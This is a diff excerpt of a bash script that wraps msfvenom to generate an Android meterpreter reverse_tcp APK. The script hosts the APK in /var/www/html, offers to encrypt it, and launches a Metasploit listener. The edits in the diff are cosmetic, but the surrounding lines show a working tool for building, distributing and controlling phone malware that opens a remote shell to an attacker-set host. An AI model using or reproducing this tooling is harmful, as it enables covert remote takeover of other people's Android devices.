@@ -83,7 +83,7 @@ read -p "  $(echo -e $red[$green+$red]$white Enter Payload Name : $nc)" payload_
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $payload_name.apk 2> /dev/null
 	echo ""
 	echo -e "$cyan			╔───────────────────────────────────────╗$nc"
-	echo -e "$cyan			│$nc $red[$green+$red]$green Payload Successfuly Generated $red[$green+$red]$cyan │$nc"
+	echo -e "$cyan			│$nc $red[$green+$red]$green Payload Successfuly Generated! $red[$green+$red]$cyan │$nc"
 	echo -e "$cyan			┖───────────────────────────────────────┙$nc\n"
 sudo cp -r $payload_name.apk /var/www/html
 	}
@@ -92,7 +92,7 @@ function size() {
 			resize -s 40 92 > /dev/null
 	}
 function cryp() {
-#### About Cryot i will Create As another Options ...
+#### About Crypto i will Create As another Options ...
 read -p "  $(echo -e $red[$green+$red]$white Do you Wanna Encrypt The Payload $red[$cyan$payload_name.apk$red]$nc $red[$green$y$white/$green$n$red]$white : $nc )" crypt
 if [[ $crypt = "Y" ]]; then
 echo -e "\n  $red[$green+$red]$white Payload Encrypter $blue\n"
@@ -146,7 +146,7 @@ then
 	echo ""
 msfconsole -r listener.rc
 else
-	echo -e "\n  $red[$yellow!$red]$white Program Closed$nc\n"
+	echo -e "\n  $red[$yellow!$red]$white Program Closed.............$nc\n"
 fi
 	}
 size
